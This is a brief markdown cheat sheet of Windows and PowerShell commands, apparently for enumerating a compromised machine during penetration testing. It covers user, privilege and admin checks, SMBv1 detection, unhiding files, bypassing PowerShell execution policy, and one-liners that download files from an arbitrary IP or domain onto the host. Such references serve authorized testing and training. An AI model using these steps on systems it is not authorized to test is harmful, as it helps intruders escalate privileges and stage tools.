## first move to a powershell:-
powershell.exe

## then the obvious:-
whoami<br />
echo %username% (if whoami doesnt work) ONLY FOR CMD NOT FOR POWERSHELL<br />
$ENV:USERNAME (if whoami doesnt work) ONLY FOR POWERSHELL NOT FOR CMD<br />
whoami /priv<br />
net user<br />
net localgroup Administrators<br />
Get-ExecutionPolicy<br />
powershell.exe -ep bypass (to set execution policy to bypass)<br />
$PSVersionTable.PSVersion.Major (to check the version of powershell)

## About the system and proccess running:-
systeminfo<br />
tasklist<br />
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) (to check if you r admin or not)<br />
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Lanmanserver\Parameters" -Name SMB1 -ErrorAction SilentlyContinue | Select-Object "SMB1") (to check for smb version 1)<br />

## Locate files in the whole drive
dir filename.extension /s (do it from C:\ folder)(supports regex)

## Unhide directories and files
attrib -h -r -s /s /d C:\*.* (The C drive can be changed to any drive of your choice)

## To Download somthing from the internet or intranet:-
powershell.exe -command (New-Object System.Net.Webclient).DownloadFile("http://ip address/domain:port/file","download location's full path\programname.extension")<br />
powershell Invoke-Webrequest -OutFile 'Dstn path.Extension' -Uri http://ip address/domain:port/file

